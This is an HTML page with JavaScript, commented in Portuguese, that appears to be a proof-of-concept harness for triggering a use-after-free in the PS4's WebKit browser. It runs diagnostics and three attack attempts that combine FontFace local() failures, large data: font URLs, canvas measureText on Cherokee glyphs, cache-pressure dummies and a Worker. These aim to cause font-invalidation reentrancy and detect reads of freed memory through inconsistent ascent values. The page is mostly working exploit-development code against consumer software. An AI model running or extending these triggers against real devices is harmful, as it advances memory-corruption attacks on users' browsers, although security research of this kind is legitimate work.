<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF — Diagnóstico + Novas Abordagens</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #ccc; padding: 14px; margin: 0; font-size: 12px; }
h1   { color: #fff; font-size: 13px; margin: 0 0 4px; }
h2   { color: #8af; font-size: 11px; margin: 10px 0 2px; }
p    { color: #777; font-size: 11px; margin: 2px 0 6px; line-height: 1.4; }
.btn { display:inline-block; padding:6px 14px; border:none; border-radius:3px;
       font-size:11px; cursor:pointer; margin:2px 1px; font-family:monospace; }
.run    { background:#1a5; color:#fff; }
.danger { background:#a21; color:#fff; }
.diag   { background:#235; color:#9cf; }
.warn   { background:#531; color:#fca; }
#log { white-space:pre-wrap; font-size:11px; background:#000; padding:10px;
       border:1px solid #222; max-height:520px; overflow-y:auto;
       margin-top:8px; border-radius:3px; line-height:1.6; }
.ok{color:#3f3} .wa{color:#fa3} .er{color:#f44}
.hd{color:#8af;font-weight:bold} .dm{color:#444}
</style>
</head>
<body>
<h1>PS4 WebKit UAF — Diagnóstico e Novas Abordagens</h1>
<p>fontBBoxAscent=11 consistente → interstitial font → fontsNeedUpdate NÃO disparou durante width()</p>
<div>
  <button class="btn diag"   onclick="runDiag()">D — Diagnóstico local() e CSS @font-face</button>
  <button class="btn danger" onclick="runA1()">A1 — CSS @font-face local() via style tag</button>
  <button class="btn danger" onclick="runA2()">A2 — FontFace.load() explícito + measureText</button>
  <button class="btn danger" onclick="runA3()">A3 — Worker font invalidation</button>
  <button class="btn run"    onclick="runAll()">▶ Todos</button>
  <button class="btn"        onclick="clearLog()" style="background:#333;color:#aaa">Limpar</button>
</div>
<div id="log"></div>
<script>
/* ─── LOG ─── */
const L = document.getElementById('log');
function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';L.appendChild(s);L.scrollTop=L.scrollHeight;}
function sep(){log('─'.repeat(60),'dm');}
function hdr(t){sep();log('  '+t,'hd');sep();}
function ok(t){log('  ✓ '+t,'ok');}
function warn(t){log('  ⚠ '+t,'wa');}
function err(t){log('  ✗ '+t,'er');}
function info(t){log('  · '+t);}
function clearLog(){L.textContent='';}

const LOCAL_BAD = 'ps4-uaf-nonexistent-xyzzy-99999';
const BIG_URL   = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
const SMALL_URL = 'url("data:font/ttf;base64,' + 'A'.repeat(100000) + '")';

/* ═══════════════════════════════════════════════════════════
   DIAGNÓSTICO D — Entender por que local() não disparou

   Verifica:
   1. Status inicial de FontFace com local() após document.fonts.add()
   2. Se f.load() explícito muda o status
   3. Se @font-face CSS via <style> processa local() diferente
   4. Qual ascent o interstitial tem (confirmar o 11)
   5. Testar nomes de fontes de sistema do PS4
   ═══════════════════════════════════════════════════════════ */
async function runDiag() {
  hdr('DIAGNÓSTICO — Por que local() não disparou?');

  /* ─── D1: Status do FontFace com local() antes e depois de add() ─── */
  info('[D1] Status de FontFace com local() inexistente...');
  try {
    const src = 'local("' + LOCAL_BAD + '"), ' + BIG_URL;
    const f   = new FontFace('diagFont1', src);
    info('  Após new FontFace(): status = ' + f.status);
    document.fonts.add(f);
    info('  Após document.fonts.add(): status = ' + f.status);
    // Aguarda uma microtask para ver se o status muda
    await Promise.resolve();
    info('  Após Promise.resolve(): status = ' + f.status);
    document.fonts.delete(f);
    if (f.status === 'unloaded') warn('  → local() NÃO foi processado automaticamente (status stayed unloaded)');
    else if (f.status === 'loaded') ok('  → local() carregou (fonte de sistema existe!)');
    else if (f.status === 'error') ok('  → local() falhou → confirma que é processado no PS4');
    else if (f.status === 'loading') info('  → local() está carregando (async)');
  } catch(e) { err('  D1 falhou: ' + e); }

  /* ─── D2: f.load() explícito com local() ─── */
  info('[D2] f.load() explícito com local() inexistente...');
  try {
    const src = 'local("' + LOCAL_BAD + '"), ' + BIG_URL;
    const f   = new FontFace('diagFont2', src);
    document.fonts.add(f);
    info('  Antes de f.load(): status = ' + f.status);
    // load() com Promise
    f.load().then(() => {
      info('  f.load() resolveu: status = ' + f.status);
    }).catch(e2 => {
      info('  f.load() rejeitou: status = ' + f.status + ' erro=' + e2);
    });
    info('  Imediatamente após f.load(): status = ' + f.status);
    await new Promise(r => setTimeout(r, 200));
    info('  Após 200ms: status = ' + f.status);
    document.fonts.delete(f);
  } catch(e) { err('  D2 falhou: ' + e); }

  /* ─── D3: Checar ascent do interstitial ─── */
  info('[D3] Medir ascent da fonte interstitial (esperado=11)...');
  try {
    const f = new FontFace('diagFont3', BIG_URL); // SÓ data:URL grande → Pending
    document.fonts.add(f);
    const c = document.createElement('canvas');
    c.width = 64; c.height = 64;
    const ctx = c.getContext('2d');
    ctx.font = '10px diagFont3';
    const tm = ctx.measureText('A');
    info('  fontBBoxAscent com fonte Pending = ' + tm.fontBoundingBoxAscent);
    info('  fontBBoxDescent com fonte Pending = ' + tm.fontBoundingBoxDescent);
    info('  emHeightAscent = ' + tm.emHeightAscent);
    document.fonts.delete(f);
  } catch(e) { err('  D3 falhou: ' + e); }

  /* ─── D4: Testar nomes de fonte de sistema do PS4 ─── */
  info('[D4] Detectar fontes de sistema disponíveis no PS4...');
  const candidateFonts = [
    'Helvetica Neue', 'Arial', 'SCE-PS3 Rodin', 'SonySketch',
    'SST', 'SST Light', 'SST Medium', 'SHSans', 'SHSans-Medium',
    'FOT-NewRodin Pro DB', 'ShinGo', 'RodinNTLGPro', 'FOT-TsukuAOldMinPro',
    'DFKaiShu', 'MingLiu', 'sans-serif', 'serif', 'monospace',
    'Courier New', 'Times New Roman', 'Georgia', 'Verdana',
  ];
  for (const name of candidateFonts) {
    try {
      const f = new FontFace('diagDetect', 'local("' + name + '")');
      document.fonts.add(f);
      await Promise.resolve();
      const st = f.status;
      document.fonts.delete(f);
      if (st === 'loaded') ok('  ENCONTRADA: "' + name + '" (status=loaded)');
      else if (st === 'error') info('  "' + name + '" processada mas falhou (status=error)');
      else info('  "' + name + '" status=' + st);
    } catch(e) { /* skip */ }
  }

  /* ─── D5: Verificar se document() está disponível para FontFace JS ─── */
  info('[D5] Checar se FontFace via JS tem contexto de documento...');
  try {
    // Se o font carrega via CSS @font-face mas não via JS FontFace,
    // o problema é o document() context
    const style = document.createElement('style');
    style.textContent = `@font-face { font-family: diagCSSFont;
      src: local("${LOCAL_BAD}"), ${BIG_URL.replace(/"/g, "'")}; }`;
    document.head.appendChild(style);
    await Promise.resolve();
    // Checar se a fonte CSS está no document.fonts
    let found = false;
    for (const f of document.fonts) {
      if (f.family === 'diagCSSFont') { found = true; info('  CSS @font-face detectado em document.fonts, status=' + f.status); }
    }
    if (!found) warn('  CSS @font-face NÃO aparece em document.fonts');
    document.head.removeChild(style);
  } catch(e) { err('  D5 falhou: ' + e); }
}

/* ═══════════════════════════════════════════════════════════
   A1 — CSS @font-face via <style> + measureText

   Diferença do teste anterior:
   CSS @font-face usa CSSFontSelector::addFontFaceRule() que
   configura corretamente o contexto de documento.
   O local() via CSS pode ter caminho diferente da JS FontFace API.

   Se @font-face CSS local() falha síncrono durante glyph walk
   → dispatchInvalidationCallbacks → fontsNeedUpdate → UAF
   ═══════════════════════════════════════════════════════════ */
async function runA1() {
  hdr('A1 — CSS @font-face local() via <style> + measureText');
  info('Diferente da JS FontFace API: usa CSSFontSelector::addFontFaceRule()');
  info('Garante contexto de documento correto para source->load(document())');

  // Criar dummies para pressionar o cache
  const dummies = [];
  for (let i = 0; i < 100; i++) {
    const c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    const ctx = c.getContext('2d');
    ctx.font = '10px "a1dummy_' + i + '_' + Math.random().toString(36).slice(2) + '"';
    dummies.push(c, ctx);
  }

  const payloadB64 = 'A'.repeat(1100000);
  const styleEl = document.createElement('style');
  const keepAlive = [];
  const results = [];

  try {
    for (let i = 0; i < 6; i++) {
      // Injetar @font-face CSS com local() inexistente
      styleEl.textContent = `
        @font-face {
          font-family: a1donor${i};
          src: local("${LOCAL_BAD}"),
               url("data:font/ttf;base64,${payloadB64}");
        }
        @font-face {
          font-family: a1target${i};
          src: local("${LOCAL_BAD}"),
               url("data:font/ttf;base64,${payloadB64}");
          unicode-range: U+13A0-13FF;
        }
      `;
      if (!styleEl.parentNode) document.head.appendChild(styleEl);

      await Promise.resolve(); // deixa CSS ser processado

      const c   = document.createElement('canvas');
      c.width   = 64; c.height = 64;
      const ctx = c.getContext('2d');
      ctx.font  = '10px a1donor' + i + ', a1target' + i;
      keepAlive.push(c, ctx, ...dummies);

      const tm   = ctx.measureText('\u13A0\u13A2\u13A4');
      const asc  = tm.fontBoundingBoxAscent;
      results.push(asc);
      info('i=' + i + ' fontBBoxAscent=' + asc + ' emAscent=' + tm.emHeightAscent);
    }

    // Analisar variância dos resultados
    const unique = [...new Set(results)];
    if (unique.length > 1) {
      warn('VALORES DIFERENTES entre iterações: ' + results.join(', '));
      warn('Pode indicar leitura de memória após UAF (valores inconsistentes)');
    } else {
      ok('A1 sem crash — fontBBoxAscent=' + unique[0] + ' (consistente)');
    }

  } catch(e) {
    err('EXCEÇÃO em A1: ' + e);
  } finally {
    if (styleEl.parentNode) document.head.removeChild(styleEl);
  }
}

/* ═══════════════════════════════════════════════════════════
   A2 — FontFace.load() explícito + measureText imediato

   Estratégia:
   1. Adicionar FontFace ao document.fonts
   2. Chamar f.load() EXPLICITAMENTE (que chama pump(Allow)!)
      CSSFontFace::load() → pump(ExternalResourceDownloadPolicy::Allow)
      Isso inicia carregamento do local() e do data: URL
   3. IMEDIATAMENTE (sem await) chamar measureText no mesmo frame
   4. Durante measureText → width() → se a fonte acabou de iniciar
      carregamento e ainda está em transição de estado...

   pump(Allow) com local() inexistente:
     → setStatus(Loading) [porque policy==Allow && status==Pending]
     → source->load() → falha síncrona
     → fontLoadEventOccurred → chain → UAF

   Timing crítico: f.load() e measureText no mesmo frame JS
   ═══════════════════════════════════════════════════════════ */
function runA2() {
  hdr('A2 — FontFace.load() explícito (pump(Allow)) + measureText imediato');
  info('f.load() chama pump(Allow) — permite carga de local() mesmo com Forbid');
  info('measureText IMEDIATO após f.load() (sem await) — janela de reentrância');

  const dummies = [];
  for (let i = 0; i < 100; i++) {
    const c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    const ctx = c.getContext('2d');
    ctx.font = '10px "a2dummy_' + i + '_' + Math.random().toString(36).slice(2) + '"';
    dummies.push(c, ctx);
  }

  const src = 'local("' + LOCAL_BAD + '"), ' + BIG_URL;
  const keepAlive = [];
  const results = [];

  try {
    for (let i = 0; i < 6; i++) {
      const donor  = new FontFace('a2donor_'  + i, src);
      const target = new FontFace('a2target_' + i, src, { unicodeRange: 'U+13A0-13FF' });
      document.fonts.add(donor);
      document.fonts.add(target);

      // .load() chama pump(ExternalResourceDownloadPolicy::Allow)!
      // Isso inicia carregamento do local() — pode falhar síncrono
      donor.load().catch(() => {});
      target.load().catch(() => {});

      // SEM AWAIT — measureText imediatamente após load()
      // O status pode estar em transição: Pending→Loading
      // Se a falha do local() dispara fontsNeedUpdate ainda neste frame...
      const c   = document.createElement('canvas');
      c.width   = 64; c.height = 64;
      const ctx = c.getContext('2d');
      ctx.font  = '10px a2donor_' + i + ', a2target_' + i;
      keepAlive.push(donor, target, c, ctx, ...dummies);

      const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
      const asc = tm.fontBoundingBoxAscent;
      results.push(asc);
      info('i=' + i + ' fontBBoxAscent=' + asc +
           ' donor.status=' + donor.status +
           ' target.status=' + target.status);
    }

    const unique = [...new Set(results)];
    if (unique.length > 1) {
      warn('VALORES DIFERENTES: ' + results.join(', ') + ' → possível UAF');
    } else {
      ok('A2 sem crash — asc=' + unique[0]);
    }
  } catch(e) {
    err('EXCEÇÃO em A2: ' + e);
  }
}

/* ═══════════════════════════════════════════════════════════
   A3 — Worker com manipulação de self.fonts + SharedArrayBuffer

   O PS4 TEM Worker. Workers têm seu próprio self.fonts.
   Estratégia:
   1. Worker adiciona/remove fontes no self.fonts em loop rápido
      → cada add/remove no Worker dispara invalidação no contexto Worker
      → Mas o FontProxy da main thread só ouve o CSSFontSelector da main thread

   LIMITAÇÃO: Workers não compartilham FontSelector com main thread.
   Mas o Worker pode se comunicar via postMessage para tentar
   sincronizar invalidações com measureText.

   Este teste verifica o comportamento e documenta limitações.

   ALTERNATIVA REAL: Se o PS4 tiver alguma API de fonte compartilhada
   entre main thread e Worker, ela seria o vetor.
   ═══════════════════════════════════════════════════════════ */
function runA3() {
  hdr('A3 — Worker font manipulation + main thread measureText');
  info('PS4 TEM Worker mas NÃO tem OffscreenCanvas');
  info('Worker não compartilha FontSelector com main thread');
  info('Documentando comportamento e limitações para o relatório');

  if (typeof Worker === 'undefined') {
    err('Worker não disponível neste browser');
    return;
  }

  const dummies = [];
  for (let i = 0; i < 100; i++) {
    const c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    const ctx = c.getContext('2d');
    ctx.font = '10px "a3dummy_' + i + '"';
    dummies.push(c, ctx);
  }

  // Worker que manipula fontes em self.fonts
  const workerCode = `
    self.onmessage = async function(e) {
      if (e.data === 'start') {
        const results = [];
        try {
          // Verificar se Worker tem self.fonts
          const hasFonts = typeof self.fonts !== 'undefined';
          results.push('hasFonts=' + hasFonts);

          if (hasFonts) {
            // Tentar adicionar e remover fontes no Worker
            const src = 'local("ps4-nonexistent-worker"), url("data:font/ttf;base64,' + 'A'.repeat(100000) + '")';
            for (let i = 0; i < 10; i++) {
              try {
                const f = new FontFace('wFont' + i, src);
                self.fonts.add(f);
                // Medir no Worker se possível (sem OffscreenCanvas, não tem canvas)
                self.fonts.delete(f);
              } catch(e2) { results.push('err_' + i + '=' + e2.message); }
            }
            results.push('worker_fonts_ok');
          }
        } catch(e) {
          results.push('worker_err=' + e.message);
        }
        self.postMessage(results);
      }
    };
  `;

  const blob   = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  const src    = 'local("' + LOCAL_BAD + '"), ' + BIG_URL;
  const keepAlive = [];

  worker.onmessage = function(e) {
    info('Worker respondeu: ' + e.data.join(', '));

    // Agora tentar measureText na main thread logo após o Worker ter manipulado fontes
    try {
      for (let i = 0; i < 4; i++) {
        const donor  = new FontFace('a3donor_'  + i, src);
        const target = new FontFace('a3target_' + i, src, { unicodeRange: 'U+13A0-13FF' });
        document.fonts.add(donor);
        document.fonts.add(target);
        const c   = document.createElement('canvas');
        c.width   = 64; c.height = 64;
        const ctx = c.getContext('2d');
        ctx.font  = '10px a3donor_' + i + ', a3target_' + i;
        keepAlive.push(donor, target, c, ctx, ...dummies);
        const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
        info('  i=' + i + ' fontBBoxAscent=' + tm.fontBoundingBoxAscent);
      }
      ok('A3 sem crash');
    } catch(ex) {
      err('EXCEÇÃO em A3 measureText: ' + ex);
    }
    worker.terminate();
  };

  worker.onerror = function(e) {
    err('Worker erro: ' + e.message);
    // Mesmo sem Worker funcionando, testar main thread
  };

  info('Worker iniciado — aguardando resposta...');
  worker.postMessage('start');
}

/* ─── runAll ─── */
async function runAll() {
  clearLog();
  await runDiag();
  await runA1();
  runA2();
  runA3();
}
</script>
</body>
</html>
